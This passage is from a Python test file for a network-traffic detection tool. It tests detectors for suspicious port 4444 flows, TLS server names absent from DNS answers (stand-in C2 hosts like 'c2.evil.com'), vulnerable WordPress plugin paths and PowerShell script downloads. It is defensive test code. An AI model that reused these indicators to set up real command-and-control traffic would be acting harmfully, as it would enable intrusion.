        state.flows[key] = FlowStats(packets=2, bytes_sent=100)

    findings = SuspiciousPortDetector().run(state, Config())

    assert len(findings) == 2
    values = sorted(f.value for f in findings)
    assert values == ["203.0.113.66:4444", "203.0.113.77:4444"]

def test_levenshtein_basic():
    assert levenshtein("kitten", "sitting") == 3
    assert levenshtein("microsoft", "microsoft") == 0
    assert levenshtein("micr0soft", "microsoft") == 1
    assert levenshtein("", "abc") == 3


# ---------- SNIMismatchDetector ----------

def test_sni_mismatch_detects_sni_not_in_dns():
    """SNI есть, но домен не резолвился через DNS — подозрительно."""
    state = CaptureState()
    key = FlowKey(
        proto="tcp",
        src_ip="192.168.1.100", dst_ip="203.0.113.66",
        src_port=54000, dst_port=443,
    )
    state.flows[key] = FlowStats(packets=10, bytes_sent=2000)
    state.flows[key].sni = "c2.evil.com"

    findings = SNIMismatchDetector().run(state, Config())

    assert len(findings) == 1
    assert findings[0].type == "sni_without_dns"
    assert findings[0].value == "c2.evil.com"
    assert findings[0].evidence["flow_count"] == 1


def test_sni_mismatch_ignores_sni_in_dns():
    """SNI есть и домен резолвился (ответ был) — не finding."""
    state = CaptureState()
    # Новая семантика: детектор смотрит на ОТВЕТЫ, не запросы.
    state.dns_answers_by_name["example.com"] = {"203.0.113.66"}

    key = FlowKey(
        proto="tcp",
        src_ip="192.168.1.100", dst_ip="203.0.113.66",
        src_port=54000, dst_port=443,
    )
    state.flows[key] = FlowStats(packets=10, bytes_sent=2000)
    state.flows[key].sni = "example.com"

    findings = SNIMismatchDetector().run(state, Config())

    assert findings == []


def test_sni_mismatch_ignores_flow_without_sni():
    """Flow без SNI (не TLS) — не проверяется."""
    state = CaptureState()
    key = FlowKey(
        proto="tcp",
        src_ip="192.168.1.100", dst_ip="203.0.113.66",
        src_port=54000, dst_port=80,
    )
    state.flows[key] = FlowStats(packets=10, bytes_sent=2000)

    findings = SNIMismatchDetector().run(state, Config())

    assert findings == []


def test_sni_mismatch_ignores_allowlisted():
    """DoH-сервисы не считаются mismatch — их SNI по определению не в DNS."""
    state = CaptureState()
    key = FlowKey(
        proto="tcp",
        src_ip="192.168.1.100", dst_ip="8.8.8.8",
        src_port=54000, dst_port=443,
    )
    state.flows[key] = FlowStats(packets=5, bytes_sent=500)
    state.flows[key].sni = "dns.google"

    findings = SNIMismatchDetector().run(state, Config())

    assert findings == []


def test_sni_mismatch_aggregates_same_sni():
    """Несколько flows с одним SNI → один finding с flow_count=3."""
    state = CaptureState()
    for sport in (54000, 54001, 54002):
        key = FlowKey(
            proto="tcp",
            src_ip="192.168.1.100", dst_ip="203.0.113.66",
            src_port=sport, dst_port=443,
        )
        state.flows[key] = FlowStats(packets=10, bytes_sent=1000)
        state.flows[key].sni = "c2.evil.com"

    findings = SNIMismatchDetector().run(state, Config())

    assert len(findings) == 1
    assert findings[0].evidence["flow_count"] == 3


def test_sni_mismatch_separate_sni():
    """Разные SNI → разные findings."""
    state = CaptureState()
    for sni, dst in [("c2-a.evil.com", "203.0.113.1"),
                     ("c2-b.evil.com", "203.0.113.2")]:
        key = FlowKey(
            proto="tcp",
            src_ip="192.168.1.100", dst_ip=dst,
            src_port=54000, dst_port=443,
        )
        state.flows[key] = FlowStats(packets=5, bytes_sent=500)
        state.flows[key].sni = sni

    findings = SNIMismatchDetector().run(state, Config())

    assert len(findings) == 2
    values = sorted(f.value for f in findings)
    assert values == ["c2-a.evil.com", "c2-b.evil.com"]

    # ---------- VulnerablePathDetector ----------


def test_vulnerable_path_wp_plugin():
    from paradox.detectors.vulnerable_path import VulnerablePathDetector

    state = CaptureState()
    key = FlowKey(
        proto="tcp",
        src_ip="10.50.3.8", dst_ip="10.100.18.5",
        src_port=49510, dst_port=80,
    )
    fs = FlowStats(packets=1, bytes_sent=25500)
    fs.http_uri = "/wp-content/plugins/post-content-shortcodes/styles/default-styles.css"
    fs.http_host = "nasledie.samregion.ru"
    fs.http_method = "GET"
    state.flows[key] = fs

    findings = VulnerablePathDetector().run(state, Config())

    assert len(findings) == 1
    assert findings[0].type == "vulnerable_path"
    assert findings[0].evidence["matched_paths"][0]["path"] == \
           "wp-content/plugins/post-content-shortcodes"


def test_vulnerable_path_script_download_ps1():
    from paradox.detectors.vulnerable_path import VulnerablePathDetector

    state = CaptureState()
    key = FlowKey(
        proto="tcp",
        src_ip="10.0.1.50", dst_ip="192.168.1.1",
        src_port=54000, dst_port=80,
    )
    fs = FlowStats(packets=1, bytes_sent=500)
    fs.http_uri = "/watch_movie.ps1"
    fs.http_host = "10.0.1.152"
    fs.http_method = "GET"
    state.flows[key] = fs

    findings = VulnerablePathDetector().run(state, Config())

    assert len(findings) == 1
    assert findings[0].type in ("vulnerable_path", "script_download")
    assert findings[0].value == "/watch_movie.ps1"
